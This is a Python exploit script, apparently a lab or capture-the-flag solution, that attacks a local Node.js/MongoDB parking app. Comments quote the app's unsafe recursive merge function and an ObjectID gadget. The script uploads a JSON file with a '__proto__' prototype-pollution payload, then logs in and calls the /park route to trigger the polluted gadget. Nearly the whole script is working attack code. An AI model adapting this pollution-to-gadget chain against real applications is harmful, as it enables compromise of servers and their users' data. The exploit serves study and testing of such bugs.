import requests as r
import json
from rich import print, inspect

if __name__ == "__main__":
    """ polluting prototype
    
        routes/users.js
        var newUsers = JSON.parse(req.file.buffer.toString())
        newUsers.map(async (item) => {
          const user = await mongo.db.collection('users')
            .findOne({ lcUsername: item.lcUsername }, { collation: { locale: "en", strength: 2 } })

          if (user) {
            mongo.db.collection('users')
              .updateOne(
                { lcUsername: item.lcUsername },
                { $set: merge(user, item) },
                ...
          }

        function merge(target, source) {
          Object.keys(source).forEach(key => {
            if (isObject(source[key])) {
              if (!target[key]) {
                target[key] = {};
              }
              merge(target[key], source[key]);
            } else {
              target[key] = source[key];
            }
          });
          return target;
        }
    """
    with open('badfile.json', 'w') as f:
        foo = "(function (x) {console.log(\"Polluted by : \", x)}".encode('utf-8')
        print(foo)
        payload = "[{\"adam\": {\"__proto__\": {\"ObjectID\": foo}}}]"
        f.write(payload)
        f.flush()

    with open('badfile.json', 'rb') as f:

        res = r.post(
            "http://localhost:3000/upload/users",
            files = {'upload-users': f}
        )
        inspect(res)
    """
        gadget execution

        locations.js
        const ObjectID = require('mongodb').ObjectID
        ...
        function getLocationById(id, cb) {
          mongo.db.collection("locations").find({'_id': ObjectID(id)})
        }

        routes/park.js
        .post('/park', loginRequired, (req, res) => {

          let location = req.body.location;
          if(location) {
            locations.getLocationById(location, (e) => {
    """
    with r.Session() as s:
        s.post(
            "http://localhost:3000/login",
            data={"username": "adam", "password": "123"} 
        )
        res = s.post(
                    "http://localhost:3000/park",
                    data={"username": "adam",
                          "licensePlate": "123",
                          "location": "Adam"
                          } 
                    )

        inspect(res)
